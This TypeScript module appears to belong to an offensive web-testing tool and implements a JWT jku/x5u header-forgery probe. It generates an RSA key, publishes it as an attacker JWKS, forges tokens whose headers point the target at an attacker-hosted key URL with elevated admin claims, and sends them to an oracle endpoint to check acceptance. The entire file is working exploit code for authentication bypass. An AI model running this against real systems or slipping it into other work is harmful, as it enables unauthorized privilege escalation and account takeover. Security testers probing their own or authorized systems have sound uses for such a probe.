import { fetchUrl } from "../adapters/http.js";
import { writeArtifact } from "../adapters/artifacts.js";
import { generateKeyPairSync, createSign, createHash } from "node:crypto";

/** JWT jku/x5u header forgery: if the verifier fetches the JWKS from a
 *  header-controlled URL, an attacker-hosted key set signs arbitrary
 *  claims. Probe: serve (or point at) an attacker JWKS, mint a signed
 *  token with that key and elevated claims, test against an oracle
 *  endpoint that distinguishes auth levels. Requires --jwks-url the
 *  target can reach (attacker host). */

export interface JwksInput {
  readonly token: string;
  readonly oracleUrl: string;
  /** URL the TARGET will fetch JWKS from (attacker-controlled) */
  readonly jwksUrl: string;
  readonly outputRoot: string;
  readonly headers?: Record<string, string>;
  readonly proxy?: string;
  readonly timeoutMs?: number;
  /** claims to forge on top of original */
  readonly elevate?: Record<string, unknown>;
  readonly kid?: string;
}
export interface JwksResult {
  readonly supported: boolean;
  readonly forged: boolean;
  readonly evidence: string;
  readonly artifacts: { path: string; bytes: number }[];
}

const b64u = (b: Buffer | string): string => Buffer.from(b).toString("base64url");

export const probeJwksForge = async (input: JwksInput): Promise<JwksResult> => {
  const enc = (s: string): string => b64u(s);
  const [h, p] = input.token.split(".");
  if (!h || !p) return { supported: false, forged: false, evidence: "malformed token", artifacts: [] };
  let header: Record<string, unknown> = {};
  let payload: Record<string, unknown> = {};
  try { header = JSON.parse(Buffer.from(h, "base64url").toString()); payload = JSON.parse(Buffer.from(p, "base64url").toString()); } catch { return { supported: false, forged: false, evidence: "undecodable token", artifacts: [] }; }
  const { publicKey, privateKey } = generateKeyPairSync("rsa", { modulusLength: 2048 });
  const kid = input.kid ?? String(header["kid"] ?? "velric-attacker-key");
  const jwks = { keys: [{ kty: "RSA", kid, n: publicKey.export({ format: "jwk" }).n, e: publicKey.export({ format: "jwk" }).e, use: "sig", alg: "RS256" }] };
  const results: { vector: string; status: number; accepted: boolean }[] = [];
  for (const vec of ["jku", "x5u"]) {
    const forgedHeader = { ...header, alg: "RS256", kid, [vec]: `${input.jwksUrl.replace(/\/$/, "")}/jwks.json` };
    const forgedPayload = { ...payload, ...(input.elevate ?? { role: "admin", isAdmin: true }) };
    const signingInput = `${enc(JSON.stringify(forgedHeader))}.${enc(JSON.stringify(forgedPayload))}`;
    const signer = createSign("RSA-SHA256");
    signer.update(signingInput);
    const sig = signer.sign(privateKey, "base64url");
    const forged = `${signingInput}.${sig}`;
    try {
      const r = await fetchUrl(input.oracleUrl, { headers: { ...input.headers, authorization: `Bearer ${forged}` }, proxy: input.proxy, timeoutMs: input.timeoutMs ?? 12000, maxAttempts: 1 });
      const accepted = r.status >= 200 && r.status < 300 && r.body.length > 0;
      results.push({ vector: vec, status: r.status, accepted });
    } catch { results.push({ vector: vec, status: 0, accepted: false }); }
  }
  const anyAccepted = results.some(r => r.accepted);
  const evidence = anyAccepted
    ? results.filter(r => r.accepted).map(r => `${r.vector} header accepted verifier (status ${r.status}) — JWKS fetched from attacker URL, claims forged`).join("; ")
    : `neither jku nor x5u accepted (${results.map(r => `${r.vector}:${r.status}`).join(", ")}) — verifier does not dereference header URLs or validates strictly`;
  const artifacts = [
    await writeArtifact(input.outputRoot, "jwks_forge.json", JSON.stringify({ jwks, results, evidence }, null, 2)),
    await writeArtifact(input.outputRoot, "jwks_forge.md", ["# JWT jku/x5u forgery", "", `- jwks (attacker): ${input.jwksUrl}/jwks.json`, ...results.map(r => `- ${r.vector}: ${r.status} ${r.accepted ? "**ACCEPTED — full claim forgery**" : "rejected"}`), "", evidence].join("\n")),
  ];
  return { supported: anyAccepted, forged: anyAccepted, evidence, artifacts };
};
